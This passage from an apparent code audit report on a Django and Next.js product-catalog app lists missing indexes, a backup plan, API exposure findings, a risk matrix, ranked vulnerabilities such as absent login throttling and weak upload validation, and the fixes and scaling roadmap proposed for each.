### 10.2 Missing Indexes

```python
# products/models.py — add to Meta:
indexes = [
    models.Index(fields=['is_active', 'is_featured']),
    models.Index(fields=['is_active', 'category']),
    models.Index(fields=['-created_at']),
]

# categories/models.py:
indexes = [
    models.Index(fields=['slug']),  # unique=True adds index but explicit is clearer
]

# inquiries/models.py:
indexes = [
    models.Index(fields=['status']),
    models.Index(fields=['-created_at']),
]
```

---

### 10.3 Database Backup Strategy

**Problem:** No backup strategy defined anywhere in the project documentation or deployment config.  
**Risk:** Single MySQL instance with no replication. Any data loss event is permanent.

**Minimum viable backup strategy:**
1. Enable automated MySQL backups in your database host (PlanetScale, Railway, or AWS RDS have built-in point-in-time recovery)
2. Add a Render cron job to export a daily MySQL dump:
   ```bash
   mysqldump -h $DB_HOST -u $DB_USER -p$DB_PASSWORD $DB_NAME | gzip > /backup/$(date +%Y%m%d).sql.gz
   ```
3. Sync dumps to S3 or Cloudflare R2

---

### 10.4 Read Replica Readiness

The current Django config uses a single `default` database. For future scaling, the ORM supports read replicas via `DATABASE_ROUTERS`:

```python
DATABASES = {
    'default': { ... },  # write
    'read': { ... },     # read replica
}
DATABASE_ROUTERS = ['utils.db_router.ReadReplicaRouter']
```

No code changes needed in views — the router handles it transparently.

---

## 11. API Security Review

### 11.1 Endpoint Exposure Audit

| Endpoint | Auth | Rate Limit | Input Validation | Notes |
|----------|------|-----------|-----------------|-------|
| `POST /api/auth/login/` | None | **MISSING** | Username + password required | Brute-force risk |
| `POST /api/auth/logout/` | JWT | None | Refresh token required | OK |
| `POST /api/auth/token/refresh/` | None | None | Refresh token required | Should throttle |
| `GET /api/auth/me/` | IsAdminUser | None | — | OK |
| `POST /api/auth/change-password/` | IsAdminUser | None | Min 8 chars | Add complexity rules |
| `GET /api/products/` | None | None | Category slug filter | **Missing pagination** |
| `GET /api/products/featured/` | None | None | — | OK, capped at 8 |
| `GET /api/products/{slug}/` | None | None | Slug validation | OK |
| `GET/POST /api/categories/` | None/IsAdmin | None | — | OK |
| `GET /api/settings/` | None | None | — | **Exposes all settings** |
| `POST /api/inquiries/` | None | **MISSING** | Basic field validation | Spam risk |
| `POST /api/admin/upload-image/` | IsAdminUser | None | Type + size | **MIME validation weak** |
| `GET /api/admin/products/` | IsAdminUser | None | — | **Missing pagination** |
| `GET /api/admin/inquiries/` | IsAdminUser | None | Status filter | **Missing pagination** |

### 11.2 Information Disclosure

**`GET /api/settings/` returns all settings publicly.** If an admin accidentally stores a sensitive value as a site setting (API key, internal note), it becomes publicly accessible.

**Fix:** Maintain a `PRIVATE_SETTINGS_KEYS` set and filter them from the public response:
```python
PRIVATE_SETTINGS_KEYS = {'internal_api_key', 'admin_note'}

def get(self, request):
    settings_qs = SiteSetting.objects.exclude(key__in=PRIVATE_SETTINGS_KEYS)
    data = {s.key: s.value for s in settings_qs}
    return success_response(data=data)
```

---

## 12. Risk Assessment Matrix

| Risk | Likelihood | Impact | Severity | Priority |
|------|-----------|--------|----------|----------|
| Brute-force login attack | High | Critical | **CRITICAL** | P0 |
| JWT token theft via XSS | Medium | Critical | **CRITICAL** | P0 |
| File upload exploitation | Low | High | **HIGH** | P1 |
| Django admin compromise | Medium | High | **HIGH** | P1 |
| Media file loss (Render free tier) | High | High | **HIGH** | P1 |
| Public inquiry spam | High | Medium | **HIGH** | P1 |
| No pagination DoS | Medium | Medium | **HIGH** | P1 |
| Secret key fallback | Low | Critical | **HIGH** | P1 |
| CORS misconfiguration in prod | Low | High | **MEDIUM** | P2 |
| Missing CSP headers | Medium | Medium | **MEDIUM** | P2 |
| N+1 queries under load | Medium | Medium | **MEDIUM** | P2 |
| No audit logging | High | Medium | **MEDIUM** | P2 |
| Cloudinary not wired in prod | High | High | **HIGH** | P1 |
| No CI/CD pipeline | High | Low | **MEDIUM** | P2 |
| No staging environment | Medium | Medium | **MEDIUM** | P2 |
| No health check endpoint | Medium | Low | **LOW** | P3 |
| Dev tools in prod Docker image | Low | Low | **LOW** | P3 |
| HSTS preload missing | Low | Low | **LOW** | P3 |

---

## 13. Production Readiness Checklist

### Security
- [ ] Rate limiting on login endpoint
- [ ] Rate limiting on inquiry endpoint
- [ ] JWT cookies set with `httpOnly` + `secure` + `sameSite=Strict`
- [ ] Content Security Policy headers configured
- [ ] Django admin URL renamed or IP-restricted
- [ ] Default `admin/admin123` password changed and documented
- [ ] Image upload validates actual file bytes (not just Content-Type header)
- [ ] `SECRET_KEY` env var mandatory (no fallback)
- [ ] `.env` confirmed not tracked in git
- [ ] `CORS_ALLOW_ALL_ORIGINS = True` never reachable in production

### Infrastructure
- [ ] Render plan upgraded from free to starter minimum
- [ ] Cloudinary wired as `DEFAULT_FILE_STORAGE` in production
- [ ] Health check endpoint at `/api/health/`
- [ ] MySQL backup strategy implemented
- [ ] Error tracking (Sentry) integrated
- [ ] Uptime monitoring (BetterUptime / UptimeRobot) configured

### Performance
- [ ] Database indexes added to Product, Inquiry models
- [ ] Pagination added to all list endpoints
- [ ] `prefetch_related('subcategories')` added to product queries
- [ ] Category `product_count` uses `annotate()` not per-row `.count()`
- [ ] `next/image` used for all product images
- [ ] Static product pages use ISR (`revalidate`)

### DevOps
- [ ] GitHub Actions CI pipeline running tests on every push
- [ ] Requirements split into base/dev/production
- [ ] Gunicorn workers sized to server CPU
- [ ] Staging environment created
- [ ] `DJANGO_SETTINGS_MODULE` explicitly set in all environments

### API
- [ ] All list endpoints paginated
- [ ] API version prefix (`/api/v1/`)
- [ ] `SiteSettings` public endpoint excludes private keys
- [ ] Phone number validation in inquiry serializer
- [ ] Settings bulk update validates against allowlist

---

## 14. Critical Vulnerabilities

### #1 — No Login Rate Limiting (CRITICAL)
**Location:** `backend/apps/authentication/views.py:9`  
**Risk:** Brute-force account takeover of the single admin account.  
**Fix:** Django REST throttling, `throttle_scope = 'login'`, `'login': '5/minute'`

### #2 — JWT in JavaScript-Accessible Cookie (CRITICAL)
**Location:** `frontend/services/api.ts:44`  
**Risk:** XSS-based admin session hijack.  
**Fix:** Backend sets `httpOnly` cookies on login; or immediately add `{ secure: true, sameSite: 'strict' }` to all `Cookies.set()` calls.

### #3 — Media Files Lost on Container Restart (HIGH)
**Location:** `backend/render.yaml`, `backend/apps/products/views.py:60`  
**Risk:** All product images permanently lost on every Render deploy or sleep/wake.  
**Fix:** Wire Cloudinary in `production.py` as `DEFAULT_FILE_STORAGE`.

### #4 — File Upload MIME Bypass (HIGH)
**Location:** `backend/apps/products/views.py:71`  
**Risk:** Malicious file upload disguised as image.  
**Fix:** Validate file bytes with `python-magic`; derive extension from validated MIME type.

### #5 — Django Admin Exposed with Default Credentials (HIGH)
**Location:** `backend/config/urls.py:7`, seed data  
**Risk:** Full database access via browser if password unchanged.  
**Fix:** Rename URL; document mandatory password change; restrict by IP.

### #6 — No Pagination on Product List (HIGH)
**Location:** `backend/apps/products/views.py:18`  
**Risk:** Growing catalog returns multi-MB JSON on every homepage load.  
**Fix:** Add `PageNumberPagination` to all list views.

### #7 — Public Inquiry Endpoint — No Rate Limit (HIGH)
**Location:** `backend/apps/inquiries/views.py:9`  
**Risk:** Database flooded with fake inquiries; legitimate requests blocked.  
**Fix:** `ScopedRateThrottle`, `'inquiry_create': '3/minute'`

### #8 — Render Free Tier in Production (HIGH)
**Location:** `backend/render.yaml:8`  
**Risk:** 30-60 second cold starts, ephemeral storage, 512MB RAM limit.  
**Fix:** Upgrade to Starter plan minimum.

### #9 — Weak SECRET_KEY Fallback (HIGH)
**Location:** `backend/config/settings/base.py:15`  
**Risk:** All cryptographic operations compromised if env var missing.  
**Fix:** Raise `RuntimeError` if `SECRET_KEY` not set in non-development mode.

### #10 — N+1 Query in Category List (MEDIUM)
**Location:** `backend/apps/categories/serializers.py:14`  
**Risk:** N SQL queries for N categories — degrades with catalog growth.  
**Fix:** `annotate(active_product_count=Count(...))`

---

## 15. Immediate Fixes Required

These can be implemented in 1-2 days and address the most critical risks:

**Day 1 — Security Hardening:**

1. Add DRF throttling to `LoginView` and `FragranceRequestCreateView`
2. Add `{ secure: true, sameSite: 'strict' }` to all `Cookies.set()` calls in frontend
3. Change `SECRET_KEY` fallback to raise `RuntimeError`
4. Wire Cloudinary `DEFAULT_FILE_STORAGE` in `production.py`
5. Rename `/django-admin/` URL in `urls.py`
6. Add `python-magic` MIME validation to image upload

**Day 2 — Performance & Infrastructure:**

7. Add pagination to `ProductListView`, `AdminProductListView`, `AdminFragranceRequestListView`
8. Add `prefetch_related('subcategories')` to product querysets
9. Replace `get_product_count` per-row query with `annotate()`
10. Add `/api/health/` endpoint
11. Upgrade Render plan from free to starter
12. Add database indexes to Product and Inquiry models

---

## 16. Enterprise Scaling Recommendations

### Phase 1 — Production Hardening (Month 1)
- Implement Redis caching (Upstash free tier or Redis Cloud)
- Migrate to Cloudinary for all media
- Add Sentry for error tracking
- Add GitHub Actions CI/CD
- Move to Render Starter or Railway

### Phase 2 — Performance (Month 2-3)
- Implement ISR for product pages (`revalidate = 300`)
- Add `next/image` everywhere
- Add Redis cache for product/category/settings endpoints
- Implement full-text search with MySQL `FULLTEXT` index on product name/description
- Celery + Redis for async tasks (inquiry email notifications)

### Phase 3 — Scale (Month 4-6)
- Migrate MySQL to managed service (PlanetScale, AWS RDS, or Supabase)
- Enable read replica routing for public read endpoints
- Configure Vercel Edge caching for public API responses
- Add rate limiting at CDN/edge level (Cloudflare)
- Implement proper audit logging to structured log service

### Phase 4 — Enterprise (6 months+)
- API versioning rollout (`/api/v1/`)
- Move image processing to background tasks (Celery)
- Add product search service (Meilisearch or Elasticsearch)
- Multi-admin role system (view-only, editor, superadmin)
- Customer portal with WhatsApp OTP authentication
- Analytics pipeline (order/view tracking)

---

## 17. Future Architecture Roadmap

```
Current State:
  Django monolith → MySQL → Local media

Phase 1 (Production-ready):
  Django → MySQL (managed) → Cloudinary → Redis (cache) → Sentry

Phase 2 (Scaled):
  ┌─────────────────────────────────────────┐
  │           Cloudflare CDN                 │
  │    (Edge caching, DDoS, rate limit)      │
  └──────────────┬──────────────────────────┘
                 │
  ┌──────────────▼──────────────┐
  │    Vercel (Next.js)          │  ← ISR + Edge Runtime
  └──────────────┬──────────────┘
                 │
  ┌──────────────▼──────────────┐
  │  Django DRF (2+ instances)   │  ← Docker + auto-scale
  │  Gunicorn 4-8 workers each   │
  └──────────┬──────┬───────────┘
             │      │
  ┌───────────▼─┐ ┌─▼──────────┐
  │  MySQL RDS  │ │ Redis Cache │
  │  + Replica  │ │  (Upstash)  │
  └─────────────┘ └────────────┘

Phase 3 (Microservices option, if catalog grows 10k+ products):
  - Products service (Django)
  - Media service (Cloudflare Workers + R2)
  - Notifications service (WhatsApp Cloud API)
  - Search service (Meilisearch)
```

---

## 18. Best Practices Recommendations

### Security Headers (add to `next.config.js`):
```javascript
async headers() {
  return [{
    source: '/(.*)',
    headers: [
      { key: 'X-DNS-Prefetch-Control', value: 'on' },
      { key: 'X-Frame-Options', value: 'DENY' },
      { key: 'X-Content-Type-Options', value: 'nosniff' },
      { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
      { key: 'Permissions-Policy', value: 'camera=(), microphone=()' },
    ],
  }]
}
```

### Rate Limiting Strategy:
```python
'DEFAULT_THROTTLE_RATES': {
    'anon': '200/day',
    'user': '1000/day',
    'login': '5/minute',          # Login attempts
    'inquiry_create': '3/minute', # Fragrance inquiry
    'token_refresh': '10/minute', # Token refresh
}
```

### CDN Recommendations:
- Cloudflare Free tier in front of Render backend (DDoS protection, caching, SSL)
- Cloudinary for image CDN (already in requirements, just needs activation)
- Vercel's built-in Edge Network for frontend (already deployed there)

### Backup Strategy:
- MySQL: daily `mysqldump` → Cloudflare R2 or S3
- Media: Cloudinary handles redundancy automatically
- Code: GitHub (already)
- Retention: 30 days rolling

### Monitoring Stack (recommended):
| Tool | Purpose | Cost |
|------|---------|------|
| Sentry | Error tracking | Free tier |
| UptimeRobot | Uptime monitoring | Free tier |
| Render metrics | CPU/memory | Built-in |
| Vercel analytics | Frontend performance | Free tier |
| Logtail | Structured logging | Free tier |

---

## 19. Final Ratings & Conclusion

### Scores

| Category | Score | Notes |
|----------|-------|-------|
| **Overall Architecture** | 7/10 | Clean structure, good separation of concerns. Missing service layer. |
| **Security** | 4/10 | No rate limiting, weak cookie flags, file upload bypass. Headers missing. |
| **Scalability** | 5/10 | No pagination, no caching, Render free tier, ephemeral storage. |
| **Performance** | 5/10 | N+1 queries, no indexes, no ISR, no image optimization, no caching. |
| **Maintainability** | 7/10 | Consistent patterns, good typing, modular apps. Tests thin on coverage. |
| **Production Readiness** | 4/10 | Blocks: no rate limiting, media loss risk, Render free tier, no CI/CD. |

### **Overall: 5.3/10 — Not production-ready without addressing P0/P1 items.**

---

### Top 10 Critical Risks

1. Brute-force login — no rate limiting
2. JWT token theft — JavaScript-accessible cookie
3. Media data loss — Render free tier, local filesystem
4. File upload bypass — user-controlled MIME type
5. Django admin exposed — predictable URL, default credentials
6. Public inquiry spam — no rate limiting
7. Catalog DoS — no pagination on product list
8. Cryptographic compromise — `SECRET_KEY` fallback value
9. Zero visibility — no error tracking, no audit logging
10. CORS all-origins — accidentally reachable in production

### Top 10 Immediate Improvements

1. Add login throttling (`5/minute`)
2. Add `secure: true, sameSite: 'strict'` to all cookie writes
3. Wire Cloudinary as `DEFAULT_FILE_STORAGE` in production
4. Add `python-magic` MIME byte validation to image upload
5. Rename Django admin URL from `/django-admin/` to something non-obvious
6. Raise `RuntimeError` if `SECRET_KEY` env var not set in production
7. Add pagination to all list endpoints
8. Upgrade Render plan from free tier
9. Add GitHub Actions CI with test suite on every push
10. Add Sentry for error tracking and alerting

### Enterprise-Ready Upgrade Path

**Week 1:** Fix all P0/P1 security items (rate limiting, cookie flags, MIME validation, SECRET_KEY guard)  
**Week 2:** Infrastructure — Cloudinary activation, Render upgrade, health check, CI/CD pipeline  
**Month 1:** Performance — pagination, Redis caching, database indexes, ISR for product pages  
**Month 2:** Observability — Sentry, structured logging, audit trail, uptime monitoring  
**Month 3:** Scale preparation — API versioning, service layer, staging environment, backup strategy  

The foundation of this project is solid — the codebase is clean, patterns are consistent, and the architecture makes sensible choices for its scale. The gap between its current state and production-readiness is not architectural rethinking — it is a focused set of security hardening tasks and infrastructure upgrades that can be completed in 2-3 weeks.

---

*Report generated from static code analysis of `d:\code\GITHUB\Project2` — commit `c535a18`. All file references are relative to the repository root.*
